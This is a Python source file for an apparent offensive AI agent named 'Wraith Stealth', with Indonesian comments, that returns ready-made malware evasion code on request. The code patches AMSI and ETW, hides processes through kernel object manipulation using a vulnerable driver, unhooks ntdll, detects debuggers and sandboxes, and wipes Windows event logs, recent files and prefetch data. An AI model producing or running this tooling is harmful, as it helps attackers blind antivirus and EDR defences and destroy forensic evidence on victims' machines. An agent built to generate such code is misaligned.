# src/agents/wraith_stealth.py
import json
from typing import Dict, Any, List
from .base import VelvetBaseAgent

class WraithStealth(VelvetBaseAgent):
    """
    Wraith Stealth — Spesialis Anti-Deteksi & Evasion.
    Mengembangkan teknik bypass AV/EDR, obfuscation, anti-debug,
    anti-forensic, log manipulation, dan stealth persistence.
    """
    
    def __init__(self, config: Dict[str, Any], tools: List = None):
        super().__init__(config, tools)
        self.evasion_techniques = {
            "amsi_bypass": self._gen_amsi_bypass,
            "etw_bypass": self._gen_etw_bypass,
            "code_obfuscation": self._gen_obfuscation,
            "anti_debug": self._gen_anti_debug,
            "anti_vm": self._gen_anti_vm,
            "log_cleaner": self._gen_log_cleaner,
            "process_hiding": self._gen_process_hiding,
            "dll_unhooking": self._gen_dll_unhooking,
        }
    
    def _gen_amsi_bypass(self, config: Dict) -> str:
        return '''
// AMSI Bypass - Patch AmsiScanBuffer
void BypassAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    
    FARPROC scan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scan) return;
    
    DWORD oldProtect;
    VirtualProtect(scan, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // mov eax, 0x80070057 (E_INVALIDARG)
    // ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(scan, patch, sizeof(patch));
    
    VirtualProtect(scan, 16, oldProtect, &oldProtect);
}
'''
    
    def _gen_etw_bypass(self, config: Dict) -> str:
        return '''
// ETW Bypass - Patch EtwEventWrite
void BypassETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etw) return;
    
    DWORD oldProtect;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etw = 0xC3; // ret
    VirtualProtect(etw, 1, oldProtect, &oldProtect);
}
'''
    
    def _gen_obfuscation(self, config: Dict) -> str:
        return '''
# Code Obfuscation Techniques

# 1. String XOR Encoding
def xor_encode(data: str, key: int = 0x3F) -> str:
    return ''.join(chr(ord(c) ^ key) for c in data)

# 2. Base64 + Custom Encoding
import base64
def custom_encode(data: str) -> str:
    return base64.b85encode(data[::-1].encode()).decode()

# 3. Dead Code Injection
def add_dead_code(code: str) -> str:
    dead = [
        "if False:\\n    pass",
        "while 0:\\n    break",
        "x = 1; x += 0",
        "try:\\n    pass\\nexcept:\\n    pass"
    ]
    import random
    return code + "\\n" + random.choice(dead)

# 4. Variable Renaming
import random, string
def random_name(length=16):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
'''
    
    def _gen_anti_debug(self, config: Dict) -> str:
        return '''
// Anti-Debug Techniques
#include <Windows.h>
#include <winternl.h>

BOOL IsDebugged() {
    // Check PEB.BeingDebugged
    PEBlite* peb = (PEBlite*)__readgsqword(0x60);
    if (peb->BeingDebugged) return TRUE;
    
    // Check NtGlobalFlag
    if (peb->NtGlobalFlag & 0x70) return TRUE;
    
    // Check DebugPort
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return TRUE;
    
    // Timing check
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    if ((end - start) > 150) return TRUE;
    
    return FALSE;
}

void AntiDebugExit() {
    if (IsDebugged()) {
        // Overwrite self and exit
        VirtualFree(GetModuleHandle(NULL), 0, MEM_RELEASE);
        ExitProcess(0);
    }
}
'''
    
    def _gen_anti_vm(self, config: Dict) -> str:
        return '''
// Anti-VM / Anti-Sandbox
BOOL IsSandbox() {
    // Check RAM
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return TRUE;
    
    // Check disk
    ULARGE_INTEGER total;
    GetDiskFreeSpaceExA("C:\\\\", NULL, &total, NULL);
    if (total.QuadPart < 100ULL * 1024 * 1024 * 1024) return TRUE;
    
    // Check VM tools
    if (GetModuleHandleA("vmtools.dll")) return TRUE;
    if (GetModuleHandleA("VBoxMouse.sys")) return TRUE;
    if (GetModuleHandleA("VBoxGuest.dll")) return TRUE;
    
    // Check CPU cores
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    
    // Check MAC vendor
    // VMware, VirtualBox, Hyper-V, Xen
    
    return FALSE;
}
'''
    
    def _gen_log_cleaner(self, config: Dict) -> str:
        return '''
# Windows Event Log Cleaner
import os, subprocess

def clear_all_logs():
    logs = ["System", "Security", "Application", "Setup", "ForwardedEvents"]
    for log in logs:
        subprocess.run(["wevtutil", "cl", log], capture_output=True)
        print(f"Cleared {log} log")

def clear_recent_files():
    recent = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent")
    for f in os.listdir(recent):
        try:
            os.remove(os.path.join(recent, f))
        except:
            pass

def wipe_prefetch():
    prefetch = "C:\\\\Windows\\\\Prefetch"
    for f in os.listdir(prefetch):
        if f.endswith(".pf"):
            try:
                os.remove(os.path.join(prefetch, f))
            except:
                pass

clear_all_logs()
clear_recent_files()
wipe_prefetch()
'''
    
    def _gen_process_hiding(self, config: Dict) -> str:
        return '''
// Process Hiding via Direct Kernel Object Manipulation
// Requires BYOVD (Bring Your Own Vulnerable Driver)

VOID HideProcess(DWORD targetPid) {
    // 1. Load vulnerable driver (gdrv.sys, capcom.sys, etc.)
    // 2. Map physical memory
    // 3. Walk EPROCESS linked list
    // 4. Unlink target process from ActiveProcessLinks
    // 5. Clear PspCidTable entry
}

VOID UnlinkProcessList(DWORD pid) {
    PEPROCESS targetProcess;
    PsLookupProcessByProcessId((HANDLE)pid, &targetProcess);
    
    // Unlink from ActiveProcessLinks
    PLIST_ENTRY current = (PLIST_ENTRY)((PUCHAR)targetProcess + 0x448);
    *((PDWORD64)current->Blink) = (DWORD64)current->Flink;
    *((PDWORD64)current->Flink + 1) = (DWORD64)current->Blink;
    current->Flink = (PLIST_ENTRY)&current->Flink;
    current->Blink = (PLIST_ENTRY)&current->Flink;
}
'''
    
    def _gen_dll_unhooking(self, config: Dict) -> str:
        return '''
// DLL Unhooking - Refresh ntdll.dll dari disk
void UnhookNtdll() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    HANDLE hMapping = CreateFileMapping(hFile, NULL, 
        PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    
    LPVOID cleanNtdll = MapViewOfFile(hMapping, 
        FILE_MAP_READ, 0, 0, 0);
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old;
            VirtualProtect((BYTE*)ntdll + sec->VirtualAddress,
                sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy((BYTE*)ntdll + sec->VirtualAddress,
                (BYTE*)cleanNtdll + sec->VirtualAddress,
                sec->Misc.VirtualSize);
            VirtualProtect((BYTE*)ntdll + sec->VirtualAddress,
                sec->Misc.VirtualSize, old, &old);
            break;
        }
    }
    
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
'''
    
    def run(self, task: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        if not context:
            context = {}
        context['agent_type'] = 'anti_detection'
        
        task_lower = task.lower()
        for tech_name, generator in self.evasion_techniques.items():
            if tech_name.replace("_", " ") in task_lower:
                context['evasion_type'] = tech_name
                break
        
        return super().run(task, context)